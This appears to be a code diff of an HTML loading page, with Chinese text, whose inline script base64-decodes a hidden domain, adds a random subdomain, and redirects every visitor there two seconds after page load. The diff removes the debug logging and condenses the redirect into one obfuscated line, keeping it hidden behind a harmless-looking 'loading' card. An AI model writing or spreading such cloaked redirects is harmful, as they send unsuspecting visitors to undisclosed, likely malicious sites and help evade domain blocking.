@@ -38,7 +38,6 @@
         }
     </style>
     <style>
-        /* 自定义加载动画 */
         .loader {
             width: 80px;
             height: 80px;
@@ -65,8 +64,6 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        /* 卡片悬停效果 */
         .loading-card {
             transition: all 0.3s ease;
         }
@@ -78,58 +75,33 @@
     </style>
 </head>
 <body class="bg-light min-h-screen flex items-center justify-center bg-grid">
-    <!-- 卡片式加载容器 -->
     <div class="loading-card bg-white rounded-2xl p-10 card-shadow max-w-md w-full mx-4">
-        <!-- 加载动画 -->
         <div class="flex flex-col items-center justify-center">
             <div class="loader mb-6"></div>
             <h1 class="text-2xl font-bold text-primary mb-2 text-center">加载中</h1>
-            <p class="text-gray-500 text-center">请稍候，系统正在处理您的请求</p>
+            <p class="text-gray-500 text-center">系统正在加载页面，请稍候...</p>
         </div>
     </div>
-<script>
-window.onload = function() {
-    const delayTime = 2000; // 延时（毫秒）
-    const encryptedProtocol = 'aHR0cHM6Ly8=';
-    const encryptedRootDomain = 'LjMwMzAwMi54eXo=';
-    
-    function getRandomString() {
-        const chars = 'abcdefghijklmnopqrstuvwxyz';
-        let result = '';
-        const length = Math.floor(Math.random() * 4) + 3;
-        for (let i = 0; i < length; i++) {
-            result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
-    }
-    
-    setTimeout(function() {
-        const protocol = atob(encryptedProtocol);
-        const randomSubdomain = getRandomString();
-        const rootDomain = atob(encryptedRootDomain);
-        const fullUrl = protocol + randomSubdomain + rootDomain;
-        
-        // 添加调试输出
-        console.log('=== 调试信息 ===');
-        console.log('解密后的协议:', protocol);
-        console.log('生成的随机子域名:', randomSubdomain);
-        console.log('解密后的根域名:', rootDomain);
-        console.log('最终生成的URL:', fullUrl);
-        console.log('=== 调试结束 ===');
-        
-        // 检查URL是否有效
-        try {
-            new URL(fullUrl);
-            console.log('URL格式有效');
-            // 执行跳转
-            window.location.href = fullUrl;
-        } catch (e) {
-            console.error('URL格式无效:', e.message);
-            debugDiv.style.background = '#ffebee';
-            debugDiv.innerHTML += `<p style="color: red;"><strong>错误:</strong> URL格式无效 - ${e.message}</p>`;
-        }
-    }, delayTime);
-};
-</script>
+    <script>
+        window.onload = function() {
+            const delayTime = 2000; // 延时（毫秒）
+            const encryptedProtocol = 'aHR0cHM6Ly8=';
+            const encryptedRootDomain = 'LjMwMzAwMi54eXo=';
+            
+            function getRandomString() {
+                const chars = 'abcdefghijklmnopqrstuvwxyz';
+                let result = '';
+                const length = Math.floor(Math.random() * 4) + 3;
+                for (let i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            setTimeout(function() {
+                window.location.href = atob(encryptedProtocol) + getRandomString() + atob(encryptedRootDomain);
+            }, delayTime);
+        };
+    </script>
 </body>
 </html>
